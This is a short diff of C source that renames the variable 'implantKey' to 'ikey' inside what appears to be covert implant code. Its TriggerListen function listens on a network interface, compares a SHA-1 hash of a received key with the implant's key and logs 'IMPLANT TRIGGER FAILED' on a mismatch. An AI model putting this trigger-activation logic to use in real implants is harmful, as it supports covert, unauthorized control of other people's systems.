@@ -38,7 +38,7 @@
 #include <arpa/inet.h>
 #endif
 
-extern unsigned char	implantKey[ID_KEY_HASH_SIZE];
+extern unsigned char	ikey[ID_KEY_HASH_SIZE];		// Implant Key
 
 //******************************************************************
 //given a range will calculate a psuedo random variance
@@ -261,7 +261,7 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 				}
 
 				sha1(tParams->idKey_hash, strlen((const char *)(tParams->idKey_hash)), recvdKey);
-				if ( memcmp(recvdKey, implantKey, ID_KEY_HASH_SIZE) )	{// Compare keys. Trigger if identical; otherwise continue waiting for a match.
+				if ( memcmp(recvdKey, ikey, ID_KEY_HASH_SIZE) )	{// Compare keys. Trigger if identical; otherwise continue waiting for a match.
 					D(
 						printf("\n=============================================================================\n");
 						printf("%s, %4d: IMPLANT TRIGGER FAILED -- KEY MISMATCH\n", __FILE__, __LINE__);
